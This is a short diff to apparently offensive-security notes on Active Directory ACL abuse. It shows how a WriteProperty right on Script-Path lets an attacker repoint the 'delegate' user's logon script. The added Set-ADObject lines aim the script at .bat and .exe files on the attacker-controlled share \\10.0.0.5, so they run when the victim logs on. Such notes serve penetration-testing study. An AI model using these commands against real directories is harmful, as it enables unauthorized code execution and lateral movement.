@@ -190,7 +190,8 @@ Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -
 `WriteProperty` on an `ObjectType`, which in this particular case is `Script-Path`, allows the attacker to overwrite the logon script path of the `delegate` user, which means that the next time, when the user `delegate` logs on, their system will execute our malicious script:
 
 ```csharp
-Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
+Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.bat"
+Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.exe"
 ```
 
 Below shows the user's ~~`delegate`~~ logon script field got updated in the AD:
